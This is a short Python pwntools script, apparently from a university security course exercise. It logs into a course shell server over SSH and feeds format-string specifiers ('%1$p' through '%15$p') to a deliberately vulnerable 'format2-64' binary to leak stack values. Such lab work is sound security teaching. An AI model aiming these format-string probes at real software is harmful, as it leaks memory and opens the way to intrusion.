from pwn import *

# exploit string
s = ssh('ahwech', 'cs4401shell.walls.ninja', keyfile='../../onyx_ssh_key')
s.set_working_directory('/problems/format2r-64_3_55908c801d6a6c58b474988e3a32b6d1/')

for i in range(1,16):
	with context.silent:
		p = s.process('./format2-64')
		p.recvline(timeout=1)
		arg = b'%' + bytes(str(i), 'utf-8') + b'$p'
		p.sendline(arg)
		print(f'Arg{i}: {p.recvline(timeout=3)}')
